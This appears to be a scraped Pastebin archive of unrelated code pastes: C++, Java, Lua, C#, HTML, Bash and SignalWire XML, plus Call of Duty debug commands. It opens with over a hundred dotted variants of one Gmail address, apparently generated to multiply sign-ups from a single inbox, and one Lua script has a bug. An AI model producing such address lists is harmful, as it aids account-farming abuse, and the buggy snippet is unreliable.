<a href=""mailto:c.269.784.6@gmail.com"">c.269.784.6@gmail.com</a>
<a href=""mailto:c.26.978.46@gmail.com"">c.26.978.46@gmail.com</a>
<a href=""mailto:c.2.6.97846@gmail.com"">c.2.6.97846@gmail.com</a>
<a href=""mailto:c269.7.84.6@gmail.com"">c269.7.84.6@gmail.com</a>
<a href=""mailto:c26.978.4.6@gmail.com"">c26.978.4.6@gmail.com</a>
<a href=""mailto:c2.6.9.7846@gmail.com"">c2.6.9.7846@gmail.com</a>
<a href=""mailto:c2.697.846@gmail.com"">c2.697.846@gmail.com</a>
<a href=""mailto:c269.7.8.4.6@gmail.com"">c269.7.8.4.6@gmail.com</a>
<a href=""mailto:c.26.97.8.46@gmail.com"">c.26.97.8.46@gmail.com</a>
<a href=""mailto:c.2.6.978.4.6@gmail.com"">c.2.6.978.4.6@gmail.com</a>
<a href=""mailto:c2.6.9.78.46@gmail.com"">c2.6.9.78.46@gmail.com</a>
<a href=""mailto:c.269.7.8.4.6@gmail.com"">c.269.7.8.4.6@gmail.com</a>
<a href=""mailto:c269.784.6@gmail.com"">c269.784.6@gmail.com</a>
<a href=""mailto:c.2697.84.6@gmail.com"">c.2697.84.6@gmail.com</a>
<a href=""mailto:c.26978.4.6@gmail.com"">c.26978.4.6@gmail.com</a>
<a href=""mailto:c.269.7.84.6@gmail.com"">c.269.7.84.6@gmail.com</a>
<a href=""mailto:c.2.697.84.6@gmail.com"">c.2.697.84.6@gmail.com</a>
<a href=""mailto:c2.6.978.4.6@gmail.com"">c2.6.978.4.6@gmail.com</a>
<a href=""mailto:c26.97846@gmail.com"">c26.97846@gmail.com</a>
<a href=""mailto:c.26.97.846@gmail.com"">c.26.97.846@gmail.com</a>
<a href=""mailto:c.2.6.97.8.46@gmail.com"">c.2.6.97.8.46@gmail.com</a>
<a href=""mailto:c.2.697.8.46@gmail.com"">c.2.697.8.46@gmail.com</a>
<a href=""mailto:c2.6.9.7.846@gmail.com"">c2.6.9.7.846@gmail.com</a>
<a href=""mailto:c.269.78.46@gmail.com"">c.269.78.46@gmail.com</a>
<a href=""mailto:c.26978.46@gmail.com"">c.26978.46@gmail.com</a>
<a href=""mailto:c.2.69.7.8.4.6@gmail.com"">c.2.69.7.8.4.6@gmail.com</a>
<a href=""mailto:c26.978.46@gmail.com"">c26.978.46@gmail.com</a>
<a href=""mailto:c.269.7.8.46@gmail.com"">c.269.7.8.46@gmail.com</a>
<a href=""mailto:c.2.6.97.84.6@gmail.com"">c.2.6.97.84.6@gmail.com</a>
<a href=""mailto:c.26.9.784.6@gmail.com"">c.26.9.784.6@gmail.com</a>
<a href=""mailto:c269.78.4.6@gmail.com"">c269.78.4.6@gmail.com</a>
<a href=""mailto:c.269784.6@gmail.com"">c.269784.6@gmail.com</a>
<a href=""mailto:c.26.9.7846@gmail.com"">c.26.9.7846@gmail.com</a>
<a href=""mailto:c26.97.8.46@gmail.com"">c26.97.8.46@gmail.com</a>
<a href=""mailto:c26.9.784.6@gmail.com"">c26.9.784.6@gmail.com</a>
<a href=""mailto:c26978.46@gmail.com"">c26978.46@gmail.com</a>
<a href=""mailto:c.2.697.8.4.6@gmail.com"">c.2.697.8.4.6@gmail.com</a>
<a href=""mailto:c.2.69.784.6@gmail.com"">c.2.69.784.6@gmail.com</a>
<a href=""mailto:c2.69.784.6@gmail.com"">c2.69.784.6@gmail.com</a>
<a href=""mailto:c2.6.9.7.8.46@gmail.com"">c2.6.9.7.8.46@gmail.com</a>
<a href=""mailto:c2.69.7.8.4.6@gmail.com"">c2.69.7.8.4.6@gmail.com</a>
<a href=""mailto:c.2.6.9.78.4.6@gmail.com"">c.2.6.9.78.4.6@gmail.com</a>
<a href=""mailto:c.2.6978.4.6@gmail.com"">c.2.6978.4.6@gmail.com</a>
<a href=""mailto:c26.97.846@gmail.com"">c26.97.846@gmail.com</a>
<a href=""mailto:c2.697846@gmail.com"">c2.697846@gmail.com</a>
<a href=""mailto:c2.6.9784.6@gmail.com"">c2.6.9784.6@gmail.com</a>
<a href=""mailto:c2.69.7.8.46@gmail.com"">c2.69.7.8.46@gmail.com</a>
<a href=""mailto:c2697.8.46@gmail.com"">c2697.8.46@gmail.com</a>
<a href=""mailto:c2697.846@gmail.com"">c2697.846@gmail.com</a>
<a href=""mailto:c.26.9784.6@gmail.com"">c.26.9784.6@gmail.com</a>
<a href=""mailto:c2.697.8.46@gmail.com"">c2.697.8.46@gmail.com</a>
<a href=""mailto:c.26.9.7.8.4.6@gmail.com"">c.26.9.7.8.4.6@gmail.com</a>
<a href=""mailto:c269.7.846@gmail.com"">c269.7.846@gmail.com</a>
<a href=""mailto:c.2.697.846@gmail.com"">c.2.697.846@gmail.com</a>
<a href=""mailto:c269.7.8.46@gmail.com"">c269.7.8.46@gmail.com</a>
<a href=""mailto:c2.6.9.7.8.4.6@gmail.com"">c2.6.9.7.8.4.6@gmail.com</a>
<a href=""mailto:c.26.978.4.6@gmail.com"">c.26.978.4.6@gmail.com</a>
<a href=""mailto:c2.6.9.7.84.6@gmail.com"">c2.6.9.7.84.6@gmail.com</a>
<a href=""mailto:c26.9.7.84.6@gmail.com"">c26.9.7.84.6@gmail.com</a>
<a href=""mailto:c2.6978.4.6@gmail.com"">c2.6978.4.6@gmail.com</a>
<a href=""mailto:c269784.6@gmail.com"">c269784.6@gmail.com</a>
<a href=""mailto:c2.6.97.8.46@gmail.com"">c2.6.97.8.46@gmail.com</a>
<a href=""mailto:c2.697.8.4.6@gmail.com"">c2.697.8.4.6@gmail.com</a>
<a href=""mailto:c.2.69784.6@gmail.com"">c.2.69784.6@gmail.com</a>
<a href=""mailto:c.2.6.9.7.846@gmail.com"">c.2.6.9.7.846@gmail.com</a>
<a href=""mailto:c.269.78.4.6@gmail.com"">c.269.78.4.6@gmail.com</a>
<a href=""mailto:c.2.697846@gmail.com"">c.2.697846@gmail.com</a>
<a href=""mailto:c.269.7.846@gmail.com"">c.269.7.846@gmail.com</a>
<a href=""mailto:c26.9.7.8.46@gmail.com"">c26.9.7.8.46@gmail.com</a>
<a href=""mailto:c2.69.7.846@gmail.com"">c2.69.7.846@gmail.com</a>
<a href=""mailto:c.26.97.8.4.6@gmail.com"">c.26.97.8.4.6@gmail.com</a>
<a href=""mailto:c.269.7846@gmail.com"">c.269.7846@gmail.com</a>
<a href=""mailto:c2697.8.4.6@gmail.com"">c2697.8.4.6@gmail.com</a>
<a href=""mailto:c.2.6.9.7.8.46@gmail.com"">c.2.6.9.7.8.46@gmail.com</a>
<a href=""mailto:c26978.4.6@gmail.com"">c26978.4.6@gmail.com</a>
<a href=""mailto:c2697.84.6@gmail.com"">c2697.84.6@gmail.com</a>
<a href=""mailto:c.2.69.7.8.46@gmail.com"">c.2.69.7.8.46@gmail.com</a>
<a href=""mailto:c2.69.7.84.6@gmail.com"">c2.69.7.84.6@gmail.com</a>
<a href=""mailto:c.26.9.7.846@gmail.com"">c.26.9.7.846@gmail.com</a>
<a href=""mailto:c.2.69.7846@gmail.com"">c.2.69.7846@gmail.com</a>
<a href=""mailto:c.2.6978.46@gmail.com"">c.2.6978.46@gmail.com</a>
<a href=""mailto:c.26.9.78.46@gmail.com"">c.26.9.78.46@gmail.com</a>
<a href=""mailto:c.2.6.9.7846@gmail.com"">c.2.6.9.7846@gmail.com</a>
<a href=""mailto:c.26.9.7.8.46@gmail.com"">c.26.9.7.8.46@gmail.com</a>
<a href=""mailto:c2.6978.46@gmail.com"">c2.6978.46@gmail.com</a>
<a href=""mailto:c.2697.8.4.6@gmail.com"">c.2697.8.4.6@gmail.com</a>
<a href=""mailto:c26.9.7.846@gmail.com"">c26.9.7.846@gmail.com</a>
<a href=""mailto:c2.69.78.46@gmail.com"">c2.69.78.46@gmail.com</a>
<a href=""mailto:c2.6.9.78.4.6@gmail.com"">c2.6.9.78.4.6@gmail.com</a>
<a href=""mailto:c2.6.97.84.6@gmail.com"">c2.6.97.84.6@gmail.com</a>
<a href=""mailto:c.2.6.9.78.46@gmail.com"">c.2.6.9.78.46@gmail.com</a>
<a href=""mailto:c.2697846@gmail.com"">c.2697846@gmail.com</a>
<a href=""mailto:c.2.6.9.7.8.4.6@gmail.com"">c.2.6.9.7.8.4.6@gmail.com</a>
<a href=""mailto:c2.6.97846@gmail.com"">c2.6.97846@gmail.com</a>
<a href=""mailto:c.2.69.78.4.6@gmail.com"">c.2.69.78.4.6@gmail.com</a>
<a href=""mailto:c2.6.97.8.4.6@gmail.com"">c2.6.97.8.4.6@gmail.com</a>
<a href=""mailto:c.2.6.9784.6@gmail.com"">c.2.6.9784.6@gmail.com</a>
<a href=""mailto:c.2.6.978.46@gmail.com"">c.2.6.978.46@gmail.com</a>
<a href=""mailto:c269.7846@gmail.com"">c269.7846@gmail.com</a>
<a href=""mailto:c.2.6.9.7.84.6@gmail.com"">c.2.6.9.7.84.6@gmail.com</a>
<a href=""mailto:c.26.97.84.6@gmail.com"">c.26.97.84.6@gmail.com</a>
<a href=""mailto:c26.9.78.46@gmail.com"">c26.9.78.46@gmail.com</a>
<a href=""mailto:c.2.6.97.8.4.6@gmail.com"">c.2.6.97.8.4.6@gmail.com</a>
<a href=""mailto:c.26.97846@gmail.com"">c.26.97846@gmail.com</a>
<a href=""mailto:c2.69.7846@gmail.com"">c2.69.7846@gmail.com</a>
<a href=""mailto:c2.69.78.4.6@gmail.com"">c2.69.78.4.6@gmail.com</a>
<a href=""mailto:c2.69784.6@gmail.com"">c2.69784.6@gmail.com</a>
<a href=""mailto:c26.9.78.4.6@gmail.com"">c26.9.78.4.6@gmail.com</a>
<a href=""mailto:c.26.9.78.4.6@gmail.com"">c.26.9.78.4.6@gmail.com</a>
<a href=""mailto:c2.6.97.846@gmail.com"">c2.6.97.846@gmail.com</a>"
pNnYc5Wu,Untitled,Skos_Martren,C++,Sunday 9th of July 2023 03:53:53 PM CDT,"class Solution {



public:
    int evalRPN(vector<string>& tokens) {
        
        const unordered_map<char, function<int (int,int)>> OperatorToLambda = { // const unordered_map<char, int(*) (int,int)> OperatorToLambda = { // good!
        {'+', [](const int f, const int s){return f+s;}},
        {'-', [](const int f, const int s){return f-s;}},
        {'*', [](const int f, const int s){return f*s;}},
        {'/', [](const int f, const int s){return f/s;}}
        };

        stack<int> Numbs;
        
        for(const string& token : tokens){

            if(token.size() == 1 && ispunct(token.front())){

                // обозначение операндов следует из примеров: [""2"",""1"",""/""] --> 2 / 1 -- то есть операнд, расположенный ближе к оператору -- стоит от него справа в выражении. В случае использовании стека элемент на вершине ближе всего к оператору
                const int  RightOperand = Numbs.top();  Numbs.pop();
                const int  LeftOperand = Numbs.top();  Numbs.pop();

                Numbs.push(OperatorToLambda.at(token.front())(LeftOperand, RightOperand));

            }else{
                Numbs.push(stoll(token));
            }
        }

        return Numbs.top();
    }
};"
pQbXcyPM,aural projector entity,cyanog3n,Java,Sunday 9th of July 2023 03:52:40 PM CDT,"package com.cyanogen.experienceobelisk.block_entities;

import net.minecraft.core.BlockPos;
import net.minecraft.server.level.ServerLevel;
import net.minecraft.world.entity.ExperienceOrb;
import net.minecraft.world.entity.LivingEntity;
import net.minecraft.world.entity.item.ItemEntity;
import net.minecraft.world.level.Level;
import net.minecraft.world.level.block.entity.BlockEntity;
import net.minecraft.world.level.block.state.BlockState;
import net.minecraftforge.event.entity.living.LivingDropsEvent;

import java.util.Collection;

public class AuralProjectorEntity extends ExperienceReceivingEntity {

    public AuralProjectorEntity(BlockPos pPos, BlockState pBlockState) {
        super(ModTileEntitiesInit.AURALPROJECTOR_BE.get(), pPos, pBlockState);
    }

    private boolean isActive = false;

    public static <T> void tick(Level level, BlockPos pos, BlockState state, T blockEntity) {

        if(level.getBlockEntity(pos) instanceof AuralProjectorEntity projector){
            projector.isActive = level.hasNeighborSignal(pos);
        }
    }

    public static void livingDropsEvent(LivingDropsEvent event){
        LivingEntity deceased = event.getEntityLiving();
        Collection<ItemEntity> c = event.getDrops();
        Level level = deceased.getLevel();
        BlockPos pos = deceased.blockPosition();

        if(!c.isEmpty() && level.isLoaded(pos) && !level.isClientSide){

            int radiusX = 4;
            int radiusY = 2;
            int radiusZ = 4;

            BlockPos firstPos = pos.west(radiusX).below(radiusY).north(radiusZ);
            BlockPos secondPos = pos.east(radiusX).above(radiusY).south(radiusZ);

            Iterable<BlockPos> iterable = BlockPos.betweenClosed(firstPos, secondPos);

            for(BlockPos position : iterable){
                BlockEntity e = level.getBlockEntity(position);
                if(e instanceof AuralProjectorEntity projector && projector.isActive){
                    event.setCanceled(true);
                    int size = c.size();

                    ServerLevel server = (ServerLevel) level;
                    server.addFreshEntity(new ExperienceOrb(server, deceased.getX(), deceased.getY(), deceased.getZ(), 10 * size));
                    break;
                }
            }
        }
    }

}
"
vXQQU2r6,printMe,Izeek182,Lua,Sunday 9th of July 2023 03:11:51 PM CDT,"local txt = {
    {
        ""   Notice From Izeek"",
        ""It is clear I am not "",
        ""welcome in the town,"",
        ""do not worry I will not"",
        ""return unless invited."",
        """",
        ""I did however want to"",
        ""inform you all, the top"",
        ""of the mountain is off"",
        ""limits to any one not"" ,
        ""trained for heavy"",
        ""machinery. This is for"",
        ""YOUR safty!""
    },
    {
        ""I will continue to work "",
        ""on tracking the "",
        ""source of the "",
        ""mysterious signal, I "",
        ""believe this is the key"",
        "" to getting home. I will "",
        ""have the mail man "",
        ""deliver updates "",
        ""regarding the signal.""
    }
}
local p = peripheral.wrap(""right"")

for key, value in pairs(txt) do
    p.newPage()
    p.setPagetitle(""Notice From Izeek page:""..key)
    for k2, v2 in pairs(t) do
        p.setCursorPos(1,k2)
        p.write(v2)
    end
    p.endPage()
end

"
xnxd3R0E,SignalWire SMS Forwarding Code,newsfeed,HTML,Sunday 9th of July 2023 03:11:32 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8""?>
<Response>
    <Message to='+18888888888'>{{From}}: {{Body}}</Message>
</Response>"
0uexTrP9,SignalWire Call Forwarding Code,newsfeed,HTML,Sunday 9th of July 2023 03:04:09 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8""?>
<Response>
    <Dial record=""record-from-ringing"" playBeep=""false"">
          <Number>+18888888888</Number>
    </Dial>
</Response>"
EBDqjZjW,PS_Test-1,bibibi_485,PowerShell,Sunday 9th of July 2023 02:57:20 PM CDT,"# New-Item -Path ""$env:USERPROFILE\Desktop"" -ItemType File -Name 'hello from pastebin.txt' -Value 'bibibi vivivi'
# New-Item -Path ""$env:USERPROFILE\Desktop"" -ItemType File -Name 'hello from pastebin2.txt' -Value 'bibibi vivivi222'
Write-Host -Object 'PasteBin' -ForegroundColor Green
pause

"
2vjTtiq7,SnapCerto.cxx,3studante,C++,Sunday 9th of July 2023 02:45:49 PM CDT,"#include <iostream>
using namespace std;

int main()
{
	int x, n, nf;
	int j = 0;

	cout << ""Digite o seu nível de coleção: "";
	cin >> n;
	x = n;

	if (n < 578)
	{
		cout << ""  Seu próximo baú roxo é no nivel: "" << 578 << endl;
	}

	else
	{
		if (n < 658 && n > 577)
		{
			cout << "" Seu próximo baú roxo é no nivel: "" << 658 << endl;
		}
		else
		{
			if (n < 738 && n > 657)
			{
				cout << ""  Seu próximo baú roxo é no nivel: "" << 738 << endl;
			}
			else
			{
				if (n < 850 && n > 737)
				{
					cout << ""  Seu próximo baú roxo é no nivel: "" << 850 << endl; 
				}
					else
					{
						if (n > 849)
						{
							n = n - 850;

							do
							{
								n = n - 120;
								j++;

							} while (n >= 1);

							nf = 850 + (j * 120);

							cout << ""\n\n         Primeira Versão \n   (Conta a partir do nível 850)"" << endl;

							cout << ""\n\n A sua próxima caixa roxa aparecerá no nivel: "" << nf << endl;
							
						  }
						}
					}
				}
			}

	return 0;
}"
qc54ZaUq,CoDUO: Key map debug commands,brague,VB.NET,Sunday 9th of July 2023 02:26:59 PM CDT,"CoDUO: Key map debug commands

by Wuphon's Reach
March 1, 2006
/devmap [mapname]
- Allows you to load a map in debug mode.

/cg_drawFPS 2
- Shows you additional information, such as the number of tris / vertices / primatives / entities visible at the moment.

/cg_drawshader 1
- Shows you the texture names under your crosshairs.

/r_showportals 1
- Draws the portal boundaries, allowing you to see how the map was sectioned out.

/r_showtris 2
- Draws the outlines of surfaces. Useful for seeing how finely an area was divided.

/r_showsurfcounts 1
- Shows the number of textures in use by a particular model.

/r_showtricounts 1
- Shows the number of triangles in use by a particular model. This is a good measure of model complexity. 





1. Create a new link to the multi-player EXE file [ ""C:\Program Files\Call of Duty\CoDMP.exe"" +set thereisacow 1337 +set developer 1 +set sv_cheats 1 +set monkeytoy 0 + set com_introplayed 1 ]
2. Fire up the link, type \devmap mp_hurtgen and then \cg_drawshader 1.
3. Point your gun at a texture."
haX8cjzL,POI Task Termites [A],erek1e,C++,Sunday 9th of July 2023 02:20:20 PM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
#include <cassert>

using namespace std;

int main() {
    ios_base::sync_with_stdio(0); cin.tie(0); cout.tie(0);
    int n; cin >> n;
    vector<long long> a(n);
    long long sum = 0;
    int nonZero = 0;
    for (long long &x : a) cin >> x, sum += x, nonZero += !!x;
    vector<vector<long long>> components;
    for (int i = 0; i < n; ++i) {
        if (a[i]) {
            if (!i || !a[i-1]) components.emplace_back();
            components.back().push_back(a[i]);
        }
    }

    for (vector<long long> &c : components) {
        vector<long long> v;
        vector<long long> newbies;
        for (int i = (int)c.size()-1; i >= 0; --i) newbies.push_back(c[i]);
        while (!newbies.empty()) {
            long long X = newbies.back();
            newbies.pop_back();
            v.push_back(X);
            size_t m = v.size();
            if (m >= 3) {
                long long x = v[m-3], M = v[m-2], y = v[m-1];
                if (x <= M && M >= y) {
                    v.resize(m-3);
                    newbies.push_back(x+y-M);
                }
            }
        }
        // now the component will be decreasing and then increasing
        c = v;
    }

    long long difference = 0; // last player's score - other player's score
    if (a.front()) {
        vector<long long> &c = components.front();
        reverse(c.begin(), c.end());
        while (c.size() >= 2) {
            size_t m = c.size();
            long long x = c[m-2], y = c[m-1];
            if (x >= y) break;
            difference += y-x; // for the last player
            c.resize(m-2);
        }
    }
    if (a.back()) {
        vector<long long> &c = components.back();
        while (c.size() >= 2) {
            size_t m = c.size();
            long long x = c[m-2], y = c[m-1];
            if (x >= y) break;
            difference += y-x; // for the last player
            c.resize(m-2);
        }
    }
    vector<long long> values;
    for (const vector<long long> &c : components) values.insert(values.end(), c.begin(), c.end());
    sort(values.begin(), values.end());
    for (size_t i = 0; i < values.size(); ++i) difference += ((i&1) ? -1 : +1) * values[i];

    if (nonZero % 2 == 0) difference = -difference;
    // difference is now first score - second score
    assert((sum+difference)%2 == 0);
    cout << (sum+difference)/2 << ' ' << (sum-difference)/2 << endl;
    return 0;
}"
TSXvWkY2,Bootstrap - lezione 4,fcamuso,HTML,Sunday 9th of July 2023 02:16:08 PM CDT,"<!doctype html>
<html lang=""en"">

<head>
  <title>Title</title>
  <!-- Required meta tags -->
  <meta charset=""utf-8"">
  <meta name=""viewport"" content=""width=device-width, initial-scale=1, shrink-to-fit=no"">

  <!-- Bootstrap CSS v5.3.0 -->
  <link href=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"" rel=""stylesheet"" 
        integrity=""sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM"" 
        crossorigin=""anonymous"">
  <style>
    img {width: 100px; height: 100px;}
    #tbl1 td {color: red;}
  </style>
</head>


<body>

  <div>
    <img class=""img-thumbnail float-start"" src=""gatto.jpg"">
    Lorem ipsum dolor sit amet consectetur adipisicing elit. Nobis commodi non numquam facilis voluptatum, reprehenderit, vitae recusandae veniam dignissimos nihil quibusdam sed! Fugit deserunt aliquid vitae voluptate pariatur! Voluptatibus, qui?
    Lorem ipsum dolor sit amet consectetur adipisicing elit. Facilis architecto itaque atque velit excepturi, sit expedita placeat saepe, aspernatur deleniti doloremque, sint laborum repellendus repudiandae! Eos quod sunt voluptas magnam?

    <img class=""img-thumbnail float-end"" src=""gatto.jpg"">
    <img class=""img-fluid clearfix"" src=""gatto.jpg"">

    Lorem ipsum dolor sit, amet consectetur adipisicing elit. Facere aliquam doloremque veritatis. Iusto dicta fuga omnis libero asperiores quod, doloremque eius iste distinctio, voluptates suscipit exercitationem. Sed rem facilis eius.
    Lorem ipsum dolor sit, amet consectetur adipisicing elit. A corporis architecto, quod veniam, quae perferendis esse necessitatibus quisquam iure porro magnam saepe? Ab, aperiam. Deserunt sunt ipsa quo sed ullam!
  </div>
  <br><br>
  
  <table>
    <tr>
      <td>Mark</td>
      <td>Otto</td>                          
      <td>@mdo</td>
    </tr>
    <tr>
      <td>Jacob</td>
      <td>Thornton</td>
      <td>@fat</td>
    </tr>
    <tr>
      <td colspan=""2"">Larry the Bird</td>
      <td>@twitter</td>
    </tr>
</table>
<br><br>
  

<div class=""m-2"">
  <table class=""table table-bordered border-primary table-hover"">
    <tr>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
    </tr>
    <tr>
      <td>Jacob</td>
      <td>Thornton</td>
      <td>@fat</td>
    </tr>
    <tr>
      <td colspan=""2"">Larry the Bird</td>
      <td>@twitter</td>
    </tr>
  </table>
</div>

<div class=""m-2 text-primary"">
  <table class=""table table-bordered border-primary table-success"">
    <tr>
      <td>Mark</td>
      <td class=""table-dark"">Otto</td>
      <td>@mdo</td>
    </tr>
    <tr class=""table-info border-primary"">
      <td>Jacob</td>
      <td>Thornton</td>
      <td>@fat</td>
    </tr>
    <tr>
      <td colspan=""2"">Larry the Bird</td>
      <td>@twitter</td>
    </tr>
  </table>
</div>

<div class=""m-2"">
  <table class=""table table-warning table-striped border-primary"">
    <tr>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
    </tr>
    <tr>
      <td>Jacob</td>
      <td>Thornton</td>
      <td>@fat</td>
    </tr>
    <tr>
      <td colspan=""2"">Larry the Bird</td>
      <td>@twitter</td>
    </tr>
  </table>
</div>


<div class=""m-2 table-responsive"">
  <table class=""table table-warning"">
    <tr>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
    </tr>
    <tr>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
    </tr>
    <tr>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
      <td>Mark</td>
      <td>Otto</td>
      <td>@mdo</td>
    </tr>        
  </table>
</div>


  <!-- Bootstrap JavaScript Libraries -->
  <script src=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"" 
          integrity=""sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz"" 
          crossorigin=""anonymous""></script>
  
</body>

</html>"
NUfEUJ9h,View Tailscale network,clausted,Bash,Sunday 9th of July 2023 02:15:56 PM CDT,"#!/usr/bin/env bash
#
## tailscale.sh
## Last edited 230709 CGL

## Check status.  Fifth & final field can have commas or semicolon.
## Remove text following comma or semicolon (e.g. ""idle, tx 37320"")
TSTATUS=$(tailscale status | sed 's/[,;][^\n]*$//g')

## Let user select a networked computer. 
IP=$(zenity --list --title=""Tailscale Network""  \
  --width=500 --height=300  \
  --column=""IP#"" --column=""Computer"" --column=""Owner"" --column=""OS"" --column=""Status"" $TSTATUS  \
  )

if [ ""$IP"" == """" ]; then 
  exit
fi

## Have user select a program. 
RUN=$(zenity --info  --title 'Run Program' \
  --text ""Select a program for $IP"" \
  --extra-button Ping \
  --extra-button SSH \
  --extra-button Browse \
  --ok-label Cancel
  )

if [ ""$RUN"" == """" ]; then 
  exit
fi

if [ ""$RUN"" == ""Ping"" ]; then
  xfce4-terminal -e ""ping -c 5 $IP"" 
  exit
fi

## Have user select a username. 
USER=$(zenity --entry --title=""User name""  \
  --text=""User name:"" --entry-text ""clausted""  \
  )

if [ ""$RUN"" == ""SSH"" ]; then
  xfce4-terminal -e ""ssh -Y $USER@$IP"" 
fi

if [ ""$RUN"" == ""Browse"" ]; then
  thunar ""ssh://$USER@$IP"" 
fi

"
rN3uwGN4,DZ_Create_Train,MayloGreen,C#,Sunday 9th of July 2023 01:50:05 PM CDT,"using System;
using System.Collections.Generic;

namespace DZ_Train
{
    class Program
    {
        public static void Main(string[] args)
         {
            RailwayStation railwayStation = new RailwayStation();

            railwayStation.Work();
        }
    }

    class RailwayStation
    {
        public void Work()
        {
            const string CreateTrainCommand = ""1"";
            const string ExitProgrammCommand = ""2"";

            TrainStation railroadStation = new TrainStation();

            bool itProgramWork = true;

            while (itProgramWork)
            {
                Console.WriteLine($""Управление программой\n{CreateTrainCommand}) Сформировать рейс и отправить\n{ExitProgrammCommand}) Завершить работу программы"");
                Console.Write(""Введите номер команды: "");
                string indexOption = Console.ReadLine();

                switch (indexOption)
                {
                    case CreateTrainCommand:
                        railroadStation.CreateTrain();
                        break;

                    case ExitProgrammCommand:
                        itProgramWork = false;
                        break;
                }

                Console.Write(""Нажмите любую клавишу "");
                Console.ReadKey();
                Console.Clear();
            }
        }
    }

    class TrainStation
    {
        private int _countRailwayСarriages = 0;

        private int _tickets = 0;

        private Random _random = new Random();

        private RoadMap _direction;

        private RoadMapGenerator _roadMapGenerator = new RoadMapGenerator();

        private List<RoadMap> _roadMaps;

        public TrainStation()
        {
            _roadMaps = _roadMapGenerator.Create();
        }

        public bool CreateDirection()
        {
            for (int i = 0; i < _roadMaps.Count; i++)
            {
                Console.WriteLine($""{i + 1}) {_roadMaps[i].PointA} : {_roadMaps[i].PointB}"");
            }

            Console.Write(""Введите номер направления: "");

            string indexRoad = Console.ReadLine();

            if (int.TryParse(indexRoad, out int number) && number > 0  && number <= _roadMaps.Count)
            {
               _direction = _roadMaps[number - 1];

                return true;
            }
            else
            {
                Console.WriteLine(""Введите корректно номер направления!!!"");
            }

            return false;
        }

        public int SaleTikets()
        {
            return _random.Next(200, 500);
        }

        public int CreateRailwayСarriage(int tickets)
        {
            RailwayСarriage railwayСarriage = new RailwayСarriage();

            int seats = railwayСarriage.SeatsCount;

            int countRailwayСarriages = tickets / seats;

            if (tickets % seats != 0)
            {
                countRailwayСarriages ++;
            }

            return countRailwayСarriages;
        }

        public void BuyAdditionalTickets()
        {
            int tempTickets = _tickets;
            int tempCountRailwayСarriages = _countRailwayСarriages;

            _tickets += SaleTikets();

            _countRailwayСarriages = CreateRailwayСarriage(_tickets);

            Train train = new Train(_countRailwayСarriages, _direction);

            tempTickets = _tickets - tempTickets;
            tempCountRailwayСarriages = _countRailwayСarriages - tempCountRailwayСarriages;

            Console.WriteLine($""\nБыло куплено новых билетов: {tempTickets}\nНовых вагонов было сформированно: {tempCountRailwayСarriages}"");
        }

        public bool DepartureTrain()
        {
            Console.WriteLine($""\nПоезд направления {_direction.PointA} : {_direction.PointB} отправлен\nИтого продано билетов: {_tickets}\nИтого сформированно вагонов: {_countRailwayСarriages}"");

            return false;
        }

        public void CreateTrain()
        {
            const string SendTrainCommand = ""1"";
            const string BuyAdditionalTicketsCommand = ""2"";

            bool continueThisMenu = true;

            Console.WriteLine(""\nФормирование поезда"");

            Console.Write(""Нажмите любую клавишу чтобы задать направление"");
            Console.ReadKey();
            Console.WriteLine();
            bool hasDirection = CreateDirection();

            if (hasDirection)
            {
                Console.Write(""\nНажмите любую клавишу чтобы продать билеты"");
                Console.ReadKey();
                _tickets = SaleTikets();
                Console.WriteLine();
                Console.WriteLine($""Текущее количество проданных билетов: {_tickets}\n"");

                Console.Write(""Нажмите любую клавишу чтобы сформировать вагоны"");
                Console.ReadKey();
